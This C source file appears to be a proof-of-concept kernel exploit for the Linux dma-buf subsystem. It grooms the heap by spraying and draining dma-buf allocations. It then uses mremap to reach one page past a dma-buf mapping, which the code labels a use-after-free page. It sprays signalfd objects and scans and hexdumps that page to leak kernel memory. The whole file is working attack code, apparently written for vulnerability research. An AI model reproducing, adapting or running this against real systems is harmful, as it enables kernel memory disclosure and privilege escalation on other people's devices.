#define _GNU_SOURCE
#include "dma_buf_t.h"
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/io.h>
#include <errno.h>
#include <stdio.h>
#include <sys/signalfd.h>
#include <string.h>

#define PAGE_SIZE (4096)
#define DMA_BUF_SIZE (7*PAGE_SIZE)

#define fatal_perror(text) do{perror("[-] " text); exit(-1);}while(0)

#define DMA_BUF_SPRAY_SIZE (8*PAGE_SIZE)
#define NUM_SPRAY_BUFS (40)

#define DMA_BUF_DRAIN_SIZE (4*PAGE_SIZE)
#define NUM_DRAIN_BUFS (2)

#define NUM_FD_SPRAYS (64)

#define NUM_SCAN_ITERATIONS (1000)

dma_buf_t* spray_bufs[NUM_SPRAY_BUFS] = {0};
dma_buf_t* drain_bufs[NUM_DRAIN_BUFS] = {0};

int fd_sprays[NUM_FD_SPRAYS] = {0};

void spray_dma_bufs()
{
    for(int i=0; i<NUM_SPRAY_BUFS; i++)
        spray_bufs[i] = dma_buf_create(DMA_BUF_SPRAY_SIZE);
}

void spray_dma_bufs_clean()
{
    for(int i=0; i<NUM_SPRAY_BUFS; i++)
    {
        dma_buf_destroy(spray_bufs[i]);
        spray_bufs[i] = NULL;
    }
}

void drain_dma_bufs()
{
    for(int i=0; i<NUM_DRAIN_BUFS; i++)
        drain_bufs[i] = dma_buf_create(DMA_BUF_DRAIN_SIZE);
}

void drain_dma_bufs_clean()
{
    for(int i=0; i<NUM_DRAIN_BUFS; i++)
    {
        dma_buf_destroy(drain_bufs[i]);
        drain_bufs[i] = NULL;
    }
}

void hexdump(char* addr, size_t len)
{
    const size_t line_size=32;
    const size_t group_by = 8;
    size_t off = 0;
    int64_t rem = len;
    printf("hexdump@%p:\n",addr);
    while(rem)
    {
        printf("+0x%04lx:", off);
        for(int l_cnt=0; l_cnt<line_size && rem; l_cnt++,off++,rem--)
        {
            if((l_cnt%group_by)==0)
                printf(" ");
            printf("%02hhx", addr[off]);
        }
        printf("\n");
    }
}

void spray_fds()
{
    uint64_t data = 0;

    for(int i=0; i<NUM_FD_SPRAYS; i++)
        fd_sprays[i] = signalfd(-1, &data, 0);
}

void spray_fds_clean()
{
    for(int i=0; i<NUM_FD_SPRAYS; i++)
        close(fd_sprays[i]);
}

int main(int argc, char* argv[])
{
    spray_dma_bufs();
    spray_dma_bufs_clean();
    drain_dma_bufs();
    dma_buf_t *dma_buf = dma_buf_create(DMA_BUF_SIZE);
    drain_dma_bufs_clean();

    if(!dma_buf)
        fatal_perror("dma_buf_create");
    char* mapping = mmap(0, dma_buf->size, PROT_READ|PROT_WRITE, MAP_SHARED, dma_buf->fd, 0);
    if(mapping == MAP_FAILED)
        fatal_perror("dma_buf mmap");
    
    char* new_mapping = mremap(mapping, dma_buf->size, dma_buf->size+PAGE_SIZE, MREMAP_MAYMOVE);
    if(new_mapping == MAP_FAILED)
        fatal_perror("dma_buf mremap");
    
    char* uaf_page = new_mapping+dma_buf->size;


    for(int i=0; i<NUM_SCAN_ITERATIONS; i++)
    {
        spray_fds();
        drain_dma_bufs(); //Make sure stolen page isn't on freelist

        //printf("[+] didn't crash\n");

        //Causes fault
        for(int j=0; j<PAGE_SIZE; j++)
        {
            if(uaf_page[j])
            {
                hexdump(uaf_page+j, 0x200);
                madvise(uaf_page, PAGE_SIZE, MADV_DONTNEED);
                exit(-1);
            }
        }
        madvise(uaf_page, PAGE_SIZE, MADV_DONTNEED);

        spray_fds_clean();
        drain_dma_bufs_clean();
    }

    hexdump(uaf_page, 0x200);
}